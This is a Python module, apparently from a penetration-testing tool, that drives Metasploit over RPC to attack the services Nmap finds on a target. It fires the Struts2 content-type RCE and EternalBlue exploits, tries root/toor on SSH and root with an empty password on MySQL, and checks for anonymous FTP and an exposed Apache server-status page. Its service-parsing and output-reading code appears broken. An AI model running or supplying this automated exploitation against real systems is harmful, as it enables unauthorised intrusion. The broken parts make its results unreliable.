import time
from pymetasploit3.msfrpc import MsfRpcClient
from config import MSF_HOST, MSF_PORT, MSF_PASSWORD
from utils.http_utils import HTTPUtils

class ExploitTester:
    def __init__(self, target_url, nmap_findings, advanced=False):
        self.target = target_url.rstrip('/')
        self.target_ip = None
        self.nmap_findings = nmap_findings
        self.advanced = advanced
        self.findings = []
        self.client = None
        self.connect_msf()

    def connect_msf(self):
        """Connect to Metasploit RPC"""
        try:
            self.client = MsfRpcClient(MSF_PASSWORD, host=MSF_HOST, port=MSF_PORT)
            self.findings.append("Metasploit: Connected to msfrpcd")
        except Exception as e:
            self.findings.append(f"Metasploit: Connection failed - {str(e)}")

    def extract_target_ip(self):
        """Extract target IP from Nmap findings"""
        for finding in self.nmap_findings:
            if "Host" in finding and "is up" in finding:
                self.target_ip = finding.split()[2]
                break
        if not self.target_ip:
            self.findings.append("Exploit: No target IP found in Nmap findings")

    def detect_services(self):
        """Detect services and versions from Nmap findings"""
        services = {}
        for finding in self.nmap_findings:
            if "Port" in finding:
                parts = finding.split(" - ")
                port_info = parts[0].split()[1]
                port, proto = port_info.split("/")
                state = port_info.split()[1]
                service = parts[1].split(" (")[0].strip()
                version = parts[1].split(" (")[1][:-1] if " (" in parts[1] else ""
                services[port] = {"proto": proto, "state": state, "service": service, "version": version}
        return services

    def run_msf_exploit(self, module_type, module, options):
        """Run a Metasploit module (auxiliary or exploit)"""
        try:
            if module_type == "auxiliary":
                msf_module = self.client.modules.use("auxiliary", module)
            elif module_type == "exploit":
                msf_module = self.client.modules.use("exploit", module)
            else:
                raise ValueError("Invalid module type")
            
            for key, value in options.items():
                msf_module[key] = value
            result = msf_module.execute()
            if result.get("job_id"):
                self.findings.append(f"Metasploit: {module} launched against {options.get('RHOSTS', 'unknown')}")
            time.sleep(5)
            console = self.client.consoles.console()
            output = console.read()
            if output["data"]:
                self.findings.append(f"Metasploit: {module} output - {output['data'].strip()}")
            return True
        except Exception as e:
            self.findings.append(f"Metasploit: {module} failed - {str(e)}")
            return False

    def test_exploits(self):
        """Test exploits based on Nmap results"""
        print(f"[*] Testing exploits on {self.target}...")
        self.extract_target_ip()
        if not self.target_ip:
            return self.findings

        # Basic HTTP checks (non-Metasploit)
        response = HTTPUtils.send_request(f"{self.target}/server-status")
        if response and response.status_code == 200:
            self.findings.append("Exploit: Apache server-status exposed")

        if not self.client or not self.advanced:
            return self.findings

        # Analyze Nmap findings for services
        services = self.detect_services()

        # Exploit attempts based on detected services
        for port, info in services.items():
            if info["state"] != "open":
                continue

            # HTTP-related exploits
            if "http" in info["service"].lower() or port in ["80", "443"]:
                self.run_msf_exploit("auxiliary", "scanner/http/http_version", 
                                    {"RHOSTS": self.target_ip, "RPORT": int(port)})
                if "apache" in info["version"].lower() or "struts" in info["version"].lower():
                    self.run_msf_exploit("exploit", "multi/http/struts2_content_type_rce",
                                        {"RHOSTS": self.target_ip, "RPORT": int(port), "TARGETURI": "/"})

            # SSH brute-force attempt
            if "ssh" in info["service"].lower() or port == "22":
                self.run_msf_exploit("auxiliary", "scanner/ssh/ssh_login",
                                    {"RHOSTS": self.target_ip, "RPORT": 22, "USERNAME": "root", "PASSWORD": "toor"})

            # SMB - EternalBlue (MS17-010)
            if "microsoft" in info["version"].lower() or port == "445":
                self.run_msf_exploit("exploit", "windows/smb/ms17_010_eternalblue",
                                    {"RHOSTS": self.target_ip, "RPORT": 445})

            # FTP anonymous login
            if "ftp" in info["service"].lower() or port == "21":
                self.run_msf_exploit("auxiliary", "scanner/ftp/anonymous",
                                    {"RHOSTS": self.target_ip, "RPORT": 21})

            # MySQL weak credentials
            if "mysql" in info["service"].lower() or port == "3306":
                self.run_msf_exploit("auxiliary", "scanner/mysql/mysql_login",
                                    {"RHOSTS": self.target_ip, "RPORT": 3306, "USERNAME": "root", "PASSWORD": ""})

        return self.findings
